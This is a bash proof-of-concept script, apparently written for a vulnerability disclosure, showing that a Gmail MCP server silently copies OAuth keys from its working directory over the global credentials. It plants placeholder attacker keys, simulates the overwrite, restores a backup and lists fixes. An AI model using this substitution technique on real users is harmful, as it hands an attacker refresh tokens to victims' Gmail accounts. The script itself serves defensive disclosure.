#!/usr/bin/env bash
# PoC: CWD Credential Substitution Attack (M2/F5)
#
# Demonstrates that the Gmail MCP Server silently copies OAuth credentials
# from the current working directory to the global config, overwriting
# existing valid credentials without confirmation.
#
# Prerequisites:
#   - Gmail MCP Server installed (npm install && npm run build)
#   - Optionally: existing credentials in ~/.gmail-mcp/
#
# What this proves:
#   - An attacker who controls CWD can substitute OAuth credentials
#   - The substitution is silent (only console.log to stderr)
#   - Existing valid credentials are overwritten without confirmation
#   - The attacker's OAuth app receives the user's auth code on next re-auth
#
# Attack scenario:
#   1. Attacker places malicious gcp-oauth.keys.json in a shared directory
#   2. Victim starts MCP server from that directory (or server CWD is set to it)
#   3. Attacker's OAuth credentials are silently installed globally
#   4. Next authentication directs the user to attacker's OAuth application
#
# Taxonomy: TL (Token/Credential Leakage)
# OWASP LLM: LLM02 (Sensitive Information Disclosure)
# Affected: src/index.ts:104-110

set -euo pipefail

TEST_DIR="/tmp/mcp-cwd-test-$$"
CONFIG_DIR="${HOME}/.gmail-mcp"
OAUTH_FILE="${CONFIG_DIR}/gcp-oauth.keys.json"
BACKUP_FILE=""

echo "=== Gmail MCP Server — CWD Credential Substitution PoC ==="
echo ""

# Step 1: Create test directory with malicious OAuth keys
echo "[*] Step 1: Creating test directory with attacker-controlled OAuth keys"
mkdir -p "${TEST_DIR}"

cat > "${TEST_DIR}/gcp-oauth.keys.json" << 'KEYS'
{
  "installed": {
    "client_id": "ATTACKER-CONTROLLED-CLIENT-ID.apps.googleusercontent.com",
    "project_id": "attacker-project",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_secret": "ATTACKER-CONTROLLED-SECRET",
    "redirect_uris": ["http://localhost:3000/oauth2callback"]
  }
}
KEYS

echo "    Created: ${TEST_DIR}/gcp-oauth.keys.json"
echo "    Contains: Attacker-controlled client_id and client_secret"
echo ""

# Step 2: Backup existing credentials if they exist
echo "[*] Step 2: Checking for existing credentials"
if [ -f "${OAUTH_FILE}" ]; then
    BACKUP_FILE="/tmp/mcp-oauth-backup-$$.json"
    cp "${OAUTH_FILE}" "${BACKUP_FILE}"
    echo "    [INFO] Existing OAuth keys found — backed up to ${BACKUP_FILE}"
    echo "    Existing client_id: $(python3 -c "import json; d=json.load(open('${OAUTH_FILE}')); print((d.get('installed') or d.get('web',{})).get('client_id','unknown'))" 2>/dev/null || echo 'unable to parse')"
else
    echo "    [INFO] No existing OAuth keys found"
fi
echo ""

# Step 3: Demonstrate the vulnerable code path
echo "[*] Step 3: Vulnerable code path analysis"
echo ""
echo "    src/index.ts:104-110:"
echo "    ┌─────────────────────────────────────────────────────────┐"
echo "    │ const localOAuthPath = path.join(process.cwd(),        │"
echo "    │     'gcp-oauth.keys.json');                            │"
echo "    │                                                        │"
echo "    │ if (fs.existsSync(localOAuthPath)) {                   │"
echo "    │     fs.copyFileSync(localOAuthPath, OAUTH_PATH);  // ! │"
echo "    │     console.log('OAuth keys found in current           │"
echo "    │         directory, copied to global config.');         │"
echo "    │ }                                                      │"
echo "    └─────────────────────────────────────────────────────────┘"
echo ""
echo "    Issues:"
echo "    1. No confirmation prompt before overwriting"
echo "    2. No integrity check on the source file"
echo "    3. console.log goes to stderr in MCP mode — user never sees it"
echo "    4. copyFileSync preserves source permissions (no chmod)"
echo ""

# Step 4: Simulate the attack (without actually running the server)
echo "[*] Step 4: Simulating credential substitution"
echo ""

# Ensure config directory exists
mkdir -p "${CONFIG_DIR}"

# Simulate what src/index.ts:107-109 does
if [ -f "${TEST_DIR}/gcp-oauth.keys.json" ]; then
    echo "    Simulating: fs.copyFileSync('${TEST_DIR}/gcp-oauth.keys.json', '${OAUTH_FILE}')"
    cp "${TEST_DIR}/gcp-oauth.keys.json" "${OAUTH_FILE}"
    echo "    [CONFIRMED] Credential substitution succeeded"
    echo ""

    # Verify the substitution
    new_client_id=$(python3 -c "import json; d=json.load(open('${OAUTH_FILE}')); print((d.get('installed') or d.get('web',{})).get('client_id','unknown'))" 2>/dev/null || echo 'unable to parse')
    echo "    New client_id in global config: ${new_client_id}"

    if echo "${new_client_id}" | grep -q "ATTACKER"; then
        echo "    [VULNERABLE] Global OAuth config now points to attacker's application"
        echo ""
        echo "    Impact: Next time the user authenticates (re-auth, token refresh),"
        echo "    the auth code will be sent to the attacker's OAuth application,"
        echo "    granting them a valid refresh token for the victim's Gmail account."
    fi
fi
echo ""

# Step 5: Clean up
echo "[*] Step 5: Cleanup"
if [ -n "${BACKUP_FILE}" ] && [ -f "${BACKUP_FILE}" ]; then
    cp "${BACKUP_FILE}" "${OAUTH_FILE}"
    rm -f "${BACKUP_FILE}"
    echo "    Restored original OAuth keys from backup"
else
    rm -f "${OAUTH_FILE}"
    echo "    Removed test OAuth keys"
fi
rm -rf "${TEST_DIR}"
echo "    Removed test directory"

echo ""
echo "=== Summary ==="
echo "Vulnerability: Silent credential substitution from CWD"
echo "Root cause:    fs.copyFileSync without confirmation at src/index.ts:109"
echo "Fix:           1. Never auto-copy from CWD — require explicit --import flag"
echo "               2. If auto-copy is kept, warn and require confirmation"
echo "               3. Check if destination already exists before overwriting"
